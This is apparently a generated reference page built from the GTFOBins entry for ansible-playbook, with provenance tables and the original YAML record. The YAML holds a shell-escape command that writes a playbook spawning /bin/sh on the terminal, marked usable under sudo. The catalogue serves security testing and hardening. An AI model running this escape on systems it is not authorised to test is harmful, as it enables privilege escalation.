---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ansible-playbook

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ansible-playbook` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ansible-playbook` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ansible-playbook](../../tools/linux/ansible-playbook.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ansible-playbook |
| name | ansible-playbook |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ansible-playbook/ |

## Preserved Source Material

```yaml
_body: ''
_name: ansible-playbook
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ansible-playbook
functions:
  shell:
  - code: 'echo ''[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'' >/path/to/temp-file

      ansible-playbook /path/to/temp-file'
    contexts:
      sudo: null
      unprivileged: null
```
